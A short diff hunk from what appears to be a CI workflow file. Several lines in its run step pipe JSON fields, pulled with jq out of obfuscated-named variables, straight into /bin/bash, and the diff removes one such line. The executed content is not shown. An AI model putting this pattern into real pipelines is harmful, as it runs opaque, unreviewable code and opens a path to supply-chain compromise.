@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$zbmdm5359" | jq -r .pxp5 | /bin/bash
           echo $spkf91085 | jq -r .xv96193 | /bin/bash
-          echo $rderw55749 | jq -r .mm9054 | /bin/bash
           echo $tm57769 | jq -r .zr0 | /bin/bash
           echo $p0677 | jq -r .usd9180 | /bin/bash
           echo $ypc591 | jq -r .gy517 | /bin/bash
